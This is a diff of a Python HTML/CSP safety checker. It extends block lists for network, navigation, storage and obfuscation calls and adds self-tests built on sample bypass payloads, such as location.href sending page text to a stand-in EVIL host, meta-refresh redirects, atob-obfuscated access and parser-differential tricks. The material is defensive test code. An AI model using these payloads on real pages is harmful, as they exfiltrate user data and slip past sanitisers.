@@ -27,15 +27,16 @@ CDN_HOSTS = {"cdnjs.cloudflare.com", "cdn.jsdelivr.net", "unpkg.com"}
 GFONTS_CSS, GFONTS_FILES = "fonts.googleapis.com", "fonts.gstatic.com"
 VERSION = r"\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.]+)?"
 # Pinned-version paths only: cdnjs /ajax/libs/<lib>/<ver>/<file>, jsDelivr /npm/<pkg>@<ver>/<file>, unpkg /<pkg>@<ver>/<file>.
+SEG = r"[A-Za-z0-9._~+-]+"  # one path segment; no '@', no '/', no escapes
 PINNED_PATH = {
-    "cdnjs.cloudflare.com": re.compile(rf"^/ajax/libs/[^/@]+/{VERSION}/[^?#]+$"),
-    "cdn.jsdelivr.net": re.compile(rf"^/npm/(?:@[^/@]+/)?[^/@]+@{VERSION}/[^?#]+$"),
-    "unpkg.com": re.compile(rf"^/(?:@[^/@]+/)?[^/@]+@{VERSION}/[^?#]+$"),
+    "cdnjs.cloudflare.com": re.compile(rf"^/ajax/libs/{SEG}/{VERSION}/(?:{SEG}/)*{SEG}$"),
+    "cdn.jsdelivr.net": re.compile(rf"^/npm/(?:@{SEG}/)?{SEG}@{VERSION}/(?:{SEG}/)*{SEG}$"),
+    "unpkg.com": re.compile(rf"^/(?:@{SEG}/)?{SEG}@{VERSION}/(?:{SEG}/)*{SEG}$"),
 }
 PLAIN_PATH = re.compile(r"^[A-Za-z0-9._~/@+-]+$")  # CSP compares paths literally; keep pinned URLs free of escapes
 SRI = re.compile(r"^sha(256|384|512)-[A-Za-z0-9+/]+={0,2}$")
 FIXED_CSP = {  # every directive except script-src/style-src is verbatim; those two are computed from the pinned tags
-    "default-src": ["'none'"], "font-src": ["data:", f"https://{GFONTS_FILES}"], "img-src": ["data:", "blob:"],
+    "default-src": ["'none'"], "font-src": ["data:", f"https://{GFONTS_FILES}/s/"], "img-src": ["data:", "blob:"],  # font-src path prefix: Google's font files only
     "media-src": ["data:", "blob:"], "connect-src": ["'none'"], "form-action": ["'none'"], "frame-src": ["'none'"],
     "object-src": ["'none'"], "base-uri": ["'none'"],
 }
@@ -43,17 +44,31 @@ ASCII_WS = re.compile(r"[\t\n\f\r ]+")
 DIRECTIVE = re.compile(r"^[A-Za-z0-9-]+$")
 BANNED_JS = re.compile(
     # network and side channels the CSP does not fully cover
-    r"\bfetch\s*\(|XMLHttpRequest|WebSocket|EventSource|sendBeacon|serviceWorker|RTCPeerConnection|RTCDataChannel|"
-    r"\bimport\s*\(|importScripts|\bWorker\s*\(|SharedWorker|\bnavigator\s*[.\[]|"
+    r"\bfetch\b|XMLHttpRequest|WebSocket|EventSource|sendBeacon|serviceWorker|RTCPeerConnection|RTCDataChannel|"
+    r"\bimport\b|importScripts|\bWorker\b|SharedWorker|\bnavigator\s*\[|"
+    r"\bnavigator\s*\.\s*(?!(?:language|languages|userAgent|platform|onLine|hardwareConcurrency|maxTouchPoints)\b)|"
+    r"\bclaude\s*[.\[]|"  # the claude.ai Artifact runtime API talks to the network on the page's behalf
     # navigation: no CSP directive governs it
-    r"\b(?:window|document|self|top|parent|globalThis)\s*\.\s*location\b|(?<![.\w$\]])location\s*[.=\[]|"
-    r"\bopen\s*\(|\.click\s*\(|dispatchEvent|\.submit\s*\(|requestSubmit|document\.write|http-equiv|<meta|"
+    r"\b(?:window|document|self|top|parent|globalThis|this)\s*\.\s*location\b|(?<![.\w$\]])location\s*[.=\[]|"
+    r"\.location\s*(?:=(?!=)|\[|\.\s*(?:href|assign|replace|reload|protocol|host|hostname|port|pathname|search|hash)\b)|"
+    r"defaultView|\bnavigation\s*[.\[]|\bassign\s*\(\s*(?:window|self|this|globalThis|top|parent|document|location)\b|"
+    r"(?<![.\w$])(?<!function )open\s*[.(\[]|\b(?:window|self|globalThis|top|parent|this|frames)\s*\.\s*open\s*[.(\[]|\.click\b|dispatchEvent|\.submit\s*\(|requestSubmit|document\.write|"
+    r"(?i:http-equiv|\bequiv\b|<meta)|"
+    # element creation the exact-URL CSP cannot fully police (query strings on an allowed URL, meta refresh)
+    r"createElement\s*\(\s*[`'\"]\s*(?:script|link|meta|base|iframe|frame|object|embed|form)\b|\.src\s*=(?!=)|"
+    r"setAttribute\s*\(\s*[`'\"]\s*(?:src|srcset|href|action|formaction|ping|poster|data|http-equiv|content)\b|"
     # storage
     r"localStorage|sessionStorage|indexedDB|document\.cookie|\bcaches\b|openDatabase|requestFileSystem|"
     # computed property access and code generation used to hide any of the above
-    r"\b(?:window|self|globalThis|document|top|parent|frames)\s*\[|\beval\b|\bFunction\s*\(|fromCharCode|\bwith\s*\(|"
-    r"\bReflect\b|['\"]\s*\+\s*['\"]"
+    r"\b(?:window|self|globalThis|document|top|parent|frames|this)\s*\[|\beval\b|\bFunction\s*\(|fromCharCode|\bwith\s*\(|"
+    r"\bReflect\b|\bprototype\b|String\.raw|['\"]\s*\+\s*['\"]|\$\{\s*['\"`]"
 )
+GF_QUERY_KEYS = {"family", "display"}
+# css2: Family+Name[:axis,list@values;...]; css (v1): Family:400,700|Other. Font-name-shaped strings only; no text= subsetting.
+GF_FAMILY = re.compile(r"^[A-Za-z0-9+]{1,40}(?::[a-z,]{1,40}@[0-9;,.-]{1,80}|:[0-9a-z,]{1,40})?$")
+RAW_ELEMS = {"script", "style", "textarea", "title", "xmp", "iframe", "noembed", "noframes", "noscript", "plaintext"}
+URL_ATTRS = {"href", "src", "srcset", "imagesrcset", "action", "formaction", "data", "poster", "ping", "xlink:href",
+             "background", "cite", "longdesc", "manifest", "codebase", "archive", "usemap"}
 CSS_URL = re.compile(r"(?:url|image-set|image)\(\s*['\"]?([^'\")]+)|@import\s+(?:url\()?['\"]?([^'\")\s;]+)", re.I)
 VOID = {"area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"}
 SVG_LEAF = {"circle", "ellipse", "line", "path", "polygon", "polyline", "rect", "use", "stop", "image", "animate",
@@ -67,18 +82,32 @@ FETCH_ATTRS = {("script", "src"), ("link", "href"), ("img", "src"), ("img", "src
                ("source", "srcset"), ("video", "src"), ("video", "poster"), ("audio", "src"), ("track", "src"),
                ("input", "src"), ("input", "formaction"), ("button", "formaction"), ("body", "background"),
                ("use", "href"), ("use", "xlink:href"), ("image", "href"), ("image", "xlink:href"),
-               ("feimage", "href"), ("feimage", "xlink:href"), ("a", "ping"), ("area", "ping")}
+               ("feimage", "href"), ("feimage", "xlink:href"), ("a", "ping"), ("area", "ping"), ("link", "imagesrcset")}
 LINK_ATTRS = {("a", "href"), ("a", "xlink:href"), ("area", "href")}
-CONTROL = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f]")
+CONTROL = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f\x85]")
+# Characters Python's \s treats as whitespace but browsers do not: an attribute separator or a comment close built from
+# one of these reads as markup to the scanner and as text to the browser.
+NONASCII_WS = re.compile("[\u00a0\u1680\u180e\u2000-\u200b\u2028\u2029\u202f\u205f\u3000\ufeff]")
 # Constructs browsers and html.parser (3.9 through 3.14) read differently; refuse them outright.
-RAW_REFUSE = [(re.compile(r"</script(?![\t\n\f\r ]*>)", re.I), "malformed </script> end tag"),
+RAWTEXT = r"(?:script|style|textarea|title|xmp|iframe|noembed|noframes|noscript|plaintext)"
+RAW_REFUSE = [(re.compile(rf"</{RAWTEXT}(?![\t\n\f\r ]*>)", re.I), "malformed raw-text end tag (</script x>, </style x>, …)"),
+              (re.compile(r"</[\t\n\f\r ]"), "'</' followed by whitespace (a bogus comment to browsers, an end tag to some scanners)"),
+              (re.compile(r"<!---?>"), "abrupt comment close (<!--> or <!--->)"),
               (re.compile(r"--!>"), "comment closed with --!>"), (re.compile(r"<!\["), "CDATA or marked section"),
               (re.compile(r"<\?"), "processing instruction")]
+COMMENT = re.compile(r"<!--(.*?)(?:-->|--!>)", re.S)  # the browser's comment extent
+COMMENT_EARLY_CLOSE = re.compile(r"--[\t\n\f\r ]+>")  # Python 3.9 closes a comment here; browsers do not
+WS = r"[\t\n\f\r ]*"
+CSP_CHARS = r"[\x20\x21\x23-\x25\x27-\x3b\x3d\x3f-\x7e]*"  # printable ASCII minus " & < >
+# The document must begin with the generated head block verbatim, so that every parser sees the same CSP in <head>.
+HEAD_PREFIX = re.compile(
+    rf"^<!doctype html>{WS}(?:<html(?:[\t\n\f\r ]+(?:lang|dir|class|id)=\"[A-Za-z0-9 _-]*\")*>{WS})?<head>{WS}"
+    rf"<meta charset=\"utf-8\"{WS}/?>{WS}<meta http-equiv=\"content-security-policy\" content=\"({CSP_CHARS})\">", re.I)
 
 
 def scheme_host(url):
     """('https', host) for http(s) URLs; ('data', None) for data:/blob:; ('frag', None) for # only; ('relative', None)."""
-    u = url.strip()
+    u = url.strip("\x00-\x20").replace("\t", "").replace("\n", "").replace("\r", "")  # the URL parser's own stripping
     if not u or u.startswith("#"):
         return "frag", None
     low = u.lower()
@@ -92,6 +121,8 @@ def scheme_host(url):
         u = "https:" + u
     p = urlsplit(u)
     if p.scheme.lower() in ("http", "https"):
+        if "\\" in u or re.search(r"\s", u) or "@" in p.netloc:  # '\' is '/' to browsers; userinfo hides the real host
+            return "bad", None
         return p.scheme.lower(), (p.hostname or "").lower()
     return "relative", None
 
@@ -106,19 +137,25 @@ def srcset_urls(s):
         j = i
         while j < n and s[j] not in ws:
             j += 1
-        if j > i:
-            urls.append(s[i:j].rstrip(","))
+        if j <= i:
+            break
+        url = s[i:j]
         i = j
-        while i < n:
-            while i < n and s[i] in ws:
+        if url.endswith(","):  # a URL ending in commas ends the candidate; descriptors are skipped
+            url = url.rstrip(",")
+        else:  # descriptors run to the next comma outside parentheses
+            depth = 0
+            while i < n:
+                c = s[i]
                 i += 1
-            k = i
-            while k < n and s[k] not in ws + ",":
-                k += 1
-            i = k
-            if i < n and s[i] == ",":
-                i += 1
-                break
+                if c == "(":
+                    depth += 1
+                elif c == ")":
+                    depth = max(0, depth - 1)
+                elif c == "," and depth == 0:
+                    break
+        if url:
+            urls.append(url)
     return urls
 
 
@@ -130,15 +167,23 @@ def pinned_source(url):
         return None, f"{url} is not https on an allowed provider (cdnjs, jsDelivr npm, unpkg)"
     if p.query or p.fragment or not PINNED_PATH[host].match(p.path) or not PLAIN_PATH.match(p.path):
         return None, f"{url} is not a pinned-version path (no @latest, no GitHub mirrors, no query string)"
+    segs = p.path.split("/")
+    if any(x in (".", "..") for x in segs) or "." not in segs[-1].strip("."):
+        return None, f"{url} must end in a file name (a trailing slash or '..' turns the CSP source into a prefix)"
     return f"https://{host}{p.path}", None
 
 
 class Scan(HTMLParser):
+    # Treat every raw-text/RCDATA element as raw text on every Python version (3.9 only knows script and style).
+    CDATA_CONTENT_ELEMENTS = ("script", "style", "textarea", "title", "xmp", "iframe", "noembed", "noframes")
+
     def __init__(self):
         super().__init__(convert_charrefs=True)
         self.bad, self.csp, self.referrer, self.in_script, self.in_style = [], None, 0, False, False
         self.stack, self.head_seq, self.scripts, self.styles, self.gfonts, self.csp_count = [], [], set(), set(), set(), 0
         self.other_seen = False  # anything before the CSP meta that would start the body in a browser
+        self.foreign_raw = None  # <style>/<title> open inside <svg>/<math>: raw text to scanners, live markup to browsers
+        self.charsets = 0
 
     def fail(self, msg):
         self.bad.append(f"line {self.getpos()[0]}: {msg}")
@@ -158,10 +203,21 @@ class Scan(HTMLParser):
                 self.other_seen = True  # before the CSP only <html>, <head> and <meta charset> may open
             if self.stack[-1:] == ["head"]:
                 self.head_seq.append((tag, a))
+        if self.foreign_raw:
+            self.fail(f"markup inside <{self.foreign_raw}> within <svg>/<math>; browsers parse it as live elements there")
         if tag in BANNED_TAGS:
             self.fail(f"<{tag}> is not allowed")
-        if tag == "script" and ({"svg", "math"} & set(self.stack)):
-            self.fail("<script> inside <svg>/<math> (character references decode differently there)")
+        if tag in RAW_ELEMS and ({"svg", "math"} & set(self.stack)):
+            if tag in ("style", "title"):
+                self.foreign_raw = tag
+            else:
+                self.fail(f"<{tag}> inside <svg>/<math> (raw text to scanners, live markup with decoded character references to browsers)")
+        if tag == "link":
+            rel = set(ASCII_WS.split(a.get("rel", "").strip("\t\n\f\r ").lower())) - {""}
+            if not rel or not rel <= LINK_RELS_OK or "href" not in a:
+                self.fail(f'<link rel="{a.get("rel", "")}"> is not allowed (only stylesheet, preconnect, dns-prefetch or icon, with href)')
+        if tag in ("set", "animate", "animatetransform", "animatemotion") and "href" in a.get("attributename", "").lower():
+            self.fail(f"<{tag} attributeName=href> animates a link target")
         if tag == "script" and a.get("type", "").strip().lower() == "module":
             self.fail("<script type=module> (static imports bypass SRI); use a UMD/IIFE build")
         if tag == "meta":
@@ -171,15 +227,17 @@ class Scan(HTMLParser):
                 self.fail(f"inline {k} handler uses {BANNED_JS.search(v).group(0).strip()!r}")
             if k == "style":
                 self.check_css(v)
-            if k in ("href", "src", "action", "formaction", "data", "xlink:href") and scheme_host(v)[0] == "javascript":
+            if k in URL_ATTRS and scheme_host(v)[0] == "javascript":
                 self.fail(f"javascript: URL in {k}")
+            if k in URL_ATTRS and scheme_host(v)[0] == "bad":
+                self.fail(f"{k} URL contains a backslash, '@' or whitespace (browsers and scanners resolve it to different hosts)")
         for (t, attr) in LINK_ATTRS:
             if tag == t and attr in a and scheme_host(a[attr])[0] in ("http", "https"):
-                if not {"noopener", "noreferrer"} <= set(a.get("rel", "").lower().split()):
+                if not {"noopener", "noreferrer"} <= set(ASCII_WS.split(a.get("rel", "").strip("\t\n\f\r ").lower())):
                     self.fail(f'<{tag} {attr}="{a[attr]}"> needs rel="noopener noreferrer"')
         for (t, attr) in FETCH_ATTRS:
             if tag == t and attr in a:
-                for url in (srcset_urls(a[attr]) if attr == "srcset" else [a[attr]]):
+                for url in (srcset_urls(a[attr]) if attr in ("srcset", "imagesrcset") else [a[attr]]):
                     self.fetch(tag, attr, url, a)
         if tag not in VOID:
             self.stack.append(tag)
@@ -189,19 +247,20 @@ class Scan(HTMLParser):
             self.in_style = True
 
     def meta(self, a):
-        he = a.get("http-equiv", "").strip().lower()
-        if "charset" in a and a["charset"].strip().lower() != "utf-8":
-            self.fail(f"charset {a['charset']!r}; only utf-8 is allowed (legacy encodings re-tokenise the markup)")
-        if he == "content-type":
-            if "charset=utf-8" not in a.get("content", "").replace(" ", "").lower():
-                self.fail("content-type meta without charset=utf-8")
-        elif he == "content-security-policy":
+        he = a.get("http-equiv", "").lower()  # browsers compare ASCII case-insensitively and do not trim
+        if "charset" in a:
+            self.charsets += 1
+            if a["charset"].lower() != "utf-8":
+                self.fail(f"charset {a['charset']!r}; only utf-8 is allowed (legacy encodings re-tokenise the markup)")
+            if self.charsets > 1:
+                self.fail("charset declared more than once")
+        if he == "content-security-policy":
             self.csp_count += 1
             if self.csp_count > 1:
                 self.fail("more than one Content-Security-Policy meta tag")
             self.csp = a.get("content", "")
-        elif he:
-            self.fail(f'http-equiv="{he}" is not allowed (meta refresh and friends navigate)')
+        elif "http-equiv" in a:
+            self.fail(f'http-equiv="{he}" is not allowed (only Content-Security-Policy; content-type and refresh are refused)')
         if a.get("name", "").strip().lower() == "referrer":
             self.referrer += 1
             if a.get("content", "").strip().lower() != "no-referrer":
@@ -217,13 +276,20 @@ class Scan(HTMLParser):
         if kind == "http":
             self.fail(f"<{tag} {attr}> uses http://; only https:// pinned providers are allowed")
             return
+        if kind in ("bad", "javascript"):
+            return  # already reported by handle_starttag
         rel = set(a.get("rel", "").lower().split())
         if tag == "script" or (tag == "link" and "stylesheet" in rel):
             if tag == "link" and host == GFONTS_CSS:
-                path = urlsplit(url).path
-                if path not in ("/css", "/css2"):
-                    self.fail(f"Google Fonts stylesheet must be /css or /css2, not {path}")
-                self.gfonts.add(f"https://{GFONTS_CSS}{path}")
+                u = urlsplit(url)
+                if u.path not in ("/css", "/css2"):
+                    self.fail(f"Google Fonts stylesheet must be /css or /css2, not {u.path}")
+                for part in u.query.split("&"):
+                    k, _, v = part.partition("=")
+                    if part and not ((k == "family" and all(GF_FAMILY.match(x) for x in v.split("|")))
+                                     or (k == "display" and v in ("auto", "block", "swap", "fallback", "optional"))):
+                        self.fail(f"Google Fonts query may only carry family= and display= ({part[:40]!r} is not a font name)")
+                self.gfonts.add(f"https://{GFONTS_CSS}{u.path}")
                 return
             src, err = pinned_source(url)
             if err:
@@ -250,6 +316,11 @@ class Scan(HTMLParser):
     def handle_endtag(self, tag):
         if self.csp is None:
             self.other_seen = True  # any end tag before the CSP; browsers turn </br> into <br>, which opens the body
+        if self.foreign_raw:
+            if tag == self.foreign_raw:
+                self.foreign_raw = None
+            else:
+                self.fail(f"markup inside <{self.foreign_raw}> within <svg>/<math>; browsers parse it as live elements there")
         if tag == "script":
             self.in_script = False
         if tag == "style":
@@ -262,12 +333,16 @@ class Scan(HTMLParser):
             self.other_seen = True
         if self.in_script and (m := BANNED_JS.search(data)):
             self.fail(f"script uses {m.group(0).strip()!r} (network, navigation, storage or obfuscation)")
+        if self.in_script and re.search(r"<!--|<script", data, re.I):
+            self.fail("script text contains <!-- or <script (script-data escape states differ between parsers)")
+        if self.foreign_raw and re.search(r"[<&]", data):
+            self.fail(f"'<' or '&' inside <{self.foreign_raw}> within <svg>/<math>; browsers parse it as live markup there")
         if self.in_style:
             self.check_css(data)
 
     def handle_comment(self, data):
-        if "--" in data:
-            self.fail("comment contains --")
+        if self.foreign_raw:
+            self.fail(f"comment inside <{self.foreign_raw}> within <svg>/<math>")
 
     def handle_decl(self, decl):
         if decl.strip().lower() != "doctype html":
@@ -280,12 +355,12 @@ class Scan(HTMLParser):
         self.fail("processing instruction is not allowed")
 
     def check_css(self, css):
+        if "\\" in css:
+            self.fail("CSS contains a backslash escape (it can spell url( past a scanner)")
         for m in CSS_URL.finditer(css):
             kind, host = scheme_host(m.group(1) or m.group(2) or "")
-            if kind == "relative":
-                self.fail("CSS references a relative file; the document must be self-contained")
-            elif kind in ("http", "https") and not (kind == "https" and host == GFONTS_FILES):
-                self.fail(f"CSS loads from {host}; only inline data: (or fonts.gstatic.com font files) are allowed")
+            if kind not in ("data", "frag"):
+                self.fail("CSS may only reference data: URIs (web fonts come through the Google Fonts stylesheet, not page CSS)")
 
 
 def csp_directives(csp):
@@ -348,21 +423,32 @@ def check_html(text):
     bad = []
     if CONTROL.search(text):
         return ["control characters in the document (legacy-encoding escapes re-tokenise the markup)"]
+    if (m := NONASCII_WS.search(text)):
+        return [f"non-ASCII whitespace U+{ord(m.group(0)):04X} at offset {m.start()} (browsers do not treat it as a space; "
+                "scanners may); write &nbsp; or a plain space"]
     for rx, why in RAW_REFUSE:
         if rx.search(text):
             bad.append(why)
+    for m in COMMENT.finditer(text):
+        if COMMENT_EARLY_CLOSE.search(m.group(1)):
+            bad.append("comment contains '-- >' (whitespace before the close; some scanners end the comment there, browsers do not)")
+    prefix = HEAD_PREFIX.match(text)
     s = Scan()
     s.feed(text)
     s.close()
     bad += s.bad
     seq = [(t, a) for t, a in s.head_seq]
-    ok_head = (len(seq) >= 2 and seq[0][0] == "meta" and set(seq[0][1]) == {"charset"} and seq[0][1]["charset"].strip().lower() == "utf-8"
-               and seq[1][0] == "meta" and seq[1][1].get("http-equiv", "").strip().lower() == "content-security-policy")
-    if s.csp is not None and (not ok_head or s.other_seen):
-        bad.append('<head> must start with <meta charset="utf-8"> followed by the Content-Security-Policy meta, with nothing else before it')
-    elif s.csp is None and not any("Content-Security-Policy" in b for b in bad):
+    ok_head = (len(seq) >= 2 and seq[0][0] == "meta" and set(seq[0][1]) == {"charset"} and seq[0][1]["charset"].lower() == "utf-8"
+               and seq[1][0] == "meta" and seq[1][1].get("http-equiv", "").lower() == "content-security-policy")
+    if not prefix or (s.csp is not None and (not ok_head or s.other_seen)):
+        bad.append('document must start with the generated head block verbatim: <!DOCTYPE html><html …><head><meta charset="utf-8">'
+                   '<meta http-equiv="Content-Security-Policy" content="…">, with nothing (not even a comment) before the CSP meta')
+    elif s.csp is None:
         bad.append('no <meta http-equiv="Content-Security-Policy"> tag inside <head>')
-    bad += check_csp(s.csp, s.scripts, s.styles, s.gfonts) if s.csp is not None else []
+    elif s.csp != prefix.group(1):
+        bad.append("the scanner read a different CSP than the head block carries (parser differential); regenerate the head block")
+    csp = prefix.group(1) if prefix else s.csp
+    bad += check_csp(csp, s.scripts, s.styles, s.gfonts) if csp is not None else []
     if s.referrer != 1:
         bad.append('exactly one <meta name="referrer" content="no-referrer"> is required')
     return bad
@@ -521,7 +607,7 @@ def check(p: Path, text=None):
             if err:
                 return [err]
         return check_html(text)
-    if ext in {".svg", ".xhtml", ".xht", ".mhtml", ".mht"}:
+    if ext in {".svg", ".svgz", ".xhtml", ".xht", ".xhtm", ".mhtml", ".mht", ".shtml", ".shtm", ".hta", ".htc"}:
         return [f"{ext} cannot carry the CSP meta tag; deliver an .html page (inline SVG is fine inside it)"]
     if ext in MACRO_EXT:
         return [f"{ext} is a macro-enabled format; save as {ext[:-1]}x"]
@@ -531,7 +617,7 @@ def check(p: Path, text=None):
         return check_ooxml(p)
     if ext == ".pdf":
         return check_pdf(p)
-    return []
+    return [f"{p.name}: {ext or 'no extension'} is not a format this check can verify; deliver .html, .docx/.xlsx/.pptx or .pdf"]
 
 
 def exempt(email: str) -> bool:
@@ -605,7 +691,14 @@ def selftest():
         doc('<textarea>notes</textarea><div onclick="this.textContent=1">x</div>'),
         doc(f'<img srcset="{PNG} 1x, {PNG} 2x"><script>const r={{location:"HQ"}};const n=r.location.name;const t="Location: "+n</script>'),
         doc("<script>const s='Total: '+n+' units'</script>"),
-        doc('<p style="color:red;background:url(data:image/png;base64,AA==)">x</p><style>@font-face{font-family:x;src:url(https://fonts.gstatic.com/s/a.woff2)}</style>'),
+        doc('<p style="color:red;background:url(data:image/png;base64,AA==)">x</p><style>@font-face{font-family:x;src:url(data:font/woff2;base64,AA==)}</style>'),
+        doc("<!-- section -- totals --><script>let i=3;while(i-- > 0){}function open(x){return x};const isOpen=true;details.open=true;"
+            "const f=new Intl.NumberFormat(navigator.language);const site={location:'HQ'};const lbl=`Site ${site.location}`</script>"),
+        doc('<textarea><script>fetch(1)</script></textarea><svg viewBox="0 0 9 9"><style>circle{fill:red}</style><title>chart</title><circle r="1"/></svg>'),
+        doc(f'<img srcset="{PNG} 1x, {PNG} 2x"><picture><source srcset="{PNG}, {PNG} 2x"><img src="{PNG}"></picture>'),
+        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,400;1,700&family=Open+Sans&display=swap">',
+            gfonts=[f"https://{GFONTS_CSS}/css2"]),
+        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700|Open+Sans">', gfonts=[f"https://{GFONTS_CSS}/css"]),
         "﻿" + doc(),  # BOM is stripped by read_html; check_html itself must also tolerate the plain doc
     ]
     for g in good:
@@ -617,11 +710,13 @@ def selftest():
         doc(f'<img src="{EVIL}/a.png" src="{PNG}">'): "repeats an attribute",
         doc(csp=f'<meta http-equiv="Content-Security-Policy" x="\x1b$B" content="{csp_text()}" y="\x1b(B">', charset='<meta charset="iso-2022-jp">'): "control characters",
         doc(charset='<meta charset="shift_jis">'): "only utf-8",
-        doc(charset='<meta http-equiv="content-type" content="text/html; charset=windows-1252">'): "charset=utf-8",
+        doc(charset='<meta http-equiv="content-type" content="text/html; charset=windows-1252">'): "must start with",
+        doc(head_extra='<meta http-equiv="content-type" content="text/html; charset=shift_jis">'): "only Content-Security-Policy",
+        doc(head_extra='<meta charset="utf-8">'): "more than once",
         # navigation and side channels
         doc(f"<script>location.href='{EVIL}/?d='+document.body.innerText</script>"): "location",
         doc(f"<script>window.open('{EVIL}')</script>"): "open(",
-        doc(f'<a id=x href="{EVIL}" rel="noopener noreferrer">x</a><script>document.getElementById("x").click()</script>'): "click(",
+        doc(f'<a id=x href="{EVIL}" rel="noopener noreferrer">x</a><script>document.getElementById("x").click()</script>'): ".click",
         doc(head_extra=f'<meta http-equiv="refresh" content="0; {EVIL}">'): "http-equiv",
         doc("<script>const pc=new RTCPeerConnection({iceServers:[{urls:'stun:x'}]})</script>"): "RTCPeerConnection",
         doc("<script>document.body.innerHTML='<meta http-equiv=refresh content=0;x>'</script>"): "<meta",
@@ -632,7 +727,7 @@ def selftest():
         doc("<svg><script>&#108;ocalStorage.setItem('k','v')</script></svg>"): "inside <svg>",
         doc("<![CDATA[><script>localStorage.setItem('k3','v3')</script>]]>"): "CDATA",
         doc("<!-- a --!><script>localStorage.setItem('k4','v4')</script> -->"): "--!>",
-        doc(f"<script>var a=1</script x><img src='{EVIL}/h.png'><script>1</script>"): "malformed </script>",
+        doc(f"<script>var a=1</script x><img src='{EVIL}/h.png'><script>1</script>"): "malformed raw-text",
         doc("<script>eval('1')</script>"): "eval",
         doc("<script>const k='fe'+'tch'</script>"): "'+'",
         doc("<script>navigator.clipboard.writeText(1)</script>"): "navigator",
@@ -641,7 +736,7 @@ def selftest():
         doc(f'<img srcset="{PNG} 1x,{EVIL}/2x.png 2x">'): "inline data",
         doc("<script>const x=row.location.name; const site={location:'HQ'}; window.location.href='x'</script>"): "location",
         doc("<script>location='https://x'</script>"): "location",
-        doc(f'<div style="background-image:image-set(\'{EVIL}/i.png\' 1x)"></div>'): "CSS loads",
+        doc(f'<div style="background-image:image-set(\'{EVIL}/i.png\' 1x)"></div>'): "data: URIs",
         doc().replace("<body>", f'<body background="{EVIL}/bg.png">'): "inline data",
         doc(f'<svg><image xlink:href="{EVIL}/x.png"/></svg>'): "inline data",
         doc(f'<input type="image" src="{EVIL}/i.png">'): "inline data",
@@ -668,7 +763,7 @@ def selftest():
         doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}; script-src https://unpkg.com">'): "repeats script-src",
         doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}; worker-src blob:">'): "extra directive",
         doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()} ">'): "non-ASCII",
-        doc(csp=""): "no <meta http-equiv=\"Content-Security-Policy\">",
+        doc(csp=""): "must start with",
         doc() + f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}">': "more than one",
         doc(pre="<title>x</title>"): "must start with",
         doc(pre="<link rel=preconnect href=https://unpkg.com>"): "must start with",
@@ -686,15 +781,72 @@ def selftest():
         doc("<script/>fetch(1)</script>"): "self-closing syntax",
         doc('<svg><foreignObject/></svg>'): "self-closing syntax",
         doc("<?xml version='1.0'?>"): "processing instruction",
-        doc("<!-- a -- b -->"): "contains --",
+        # head-block canonical form: attribute-tokenising differentials cannot reach the CSP
+        doc(csp=f'<meta http-equiv=" Content-Security-Policy" content="{csp_text()}">'): "must start with",
+        doc(csp=f'<meta http-equiv="Content-Security-Policy" content=="{csp_text()}">'): "must start with",
+        doc(csp=f'<meta http-equiv="Content-Security-Policy"\u00a0content="{csp_text()}">'): "non-ASCII whitespace U+00A0",
+        doc(csp=f'<meta http-equiv="Content-Security-Policy"\u0085content="{csp_text()}">'): "control characters",
+        doc(csp='<meta http-equiv="Content-Security-Policy" content="' + csp_text().replace("; ", ";" + chr(12)) + '">'): "must start with",
+        doc(pre="<!-- x -->"): "must start with",
+        doc(pre=f"<!-- -- ><meta http-equiv=\"Content-Security-Policy\" content=\"{csp_text()}\"> -->", csp=""): "-- >",
+        doc("<!--><p>-->"): "abrupt comment close",
+        doc("<!--->"): "abrupt comment close",
+        doc("<!---->"): "",  # an empty comment is fine
+        doc(charset='<meta charset="\u00a0utf-8">'): "non-ASCII whitespace",
+        # raw-text element boundaries
+        doc("<script><!--<script>//</script>\nlocalStorage.setItem('n6','v')</script>"): "script text contains",
+        doc("<script>/*</ script>*/ localStorage.setItem('x','1')</script>"): "'</' followed by whitespace",
+        doc("<style>p{}</style x><script>localStorage.setItem('x','1')</script><style></style>"): "malformed raw-text end tag",
+        doc("<svg><style><p></p><script>localStorage.setItem('x','1')</script></style></svg>"): "within <svg>",
+        doc(f'<svg><style><meta http-equiv="refresh" content="1;url={EVIL}/r"></style></svg>'): "within <svg>",
+        doc(f'<svg><title><meta http-equiv="refresh" content="1;url={EVIL}/r"></title></svg>'): "within <svg>",
+        doc("<svg><textarea>x</textarea></svg>"): "inside <svg>/<math>",
+        # navigation and storage through aliases, computed access and DOM insertion
+        doc(f"<script>setTimeout(()=>Object.assign(window,{{location:'{EVIL}'}}),1)</script>"): "assign(window",
+        doc(f"<script>this.location='{EVIL}'</script>"): "this.location",
+        doc(f"<script>const w=this;w.location='{EVIL}'</script>"): ".location=",
+        doc(f"<script>document.defaultView.location.href='{EVIL}'</script>"): "defaultView",
+        doc(f"<script>navigation.navigate('{EVIL}')</script>"): "navigation.",
+        doc(f"<script>open.call(this,'{EVIL}')</script>"): "open.",
+        doc('<script>HTMLElement.prototype.click.call(document.getElementById("x"))</script>'): "prototype",
+        doc("<script>document.head.insertAdjacentHTML('beforeend',`<${'meta'} http${'-'}equiv=refresh content=\"0;x\">`)</script>"): "${'",
+        doc("<script>this[`local${'Storage'}`].setItem('rt','v')</script>"): "this[",
+        doc("<script>this[atob('bG9jYWxTdG9yYWdl')].setItem('a','1')</script>"): "this[",
+        doc("<script>if(window.claude&&window.claude.use){window.claude.use('db')}</script>"): "claude.",
+        doc("<script>const s=document.createElement('script');document.head.append(s)</script>"): "createElement('script",
+        doc("<script>document.scripts[0].src='https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js?d=1'</script>"): ".src=",
+        doc("<script>el.setAttribute('href','x')</script>"): "setAttribute('href",
+        doc("<script>const p=new (this[atob('UlRDUGVlckNvbm5lY3Rpb24=')])()</script>"): "this[",
+        doc("<a href=\"java&#9;script:localStorage.setItem('rj','v')\">x</a>"): "javascript: URL",
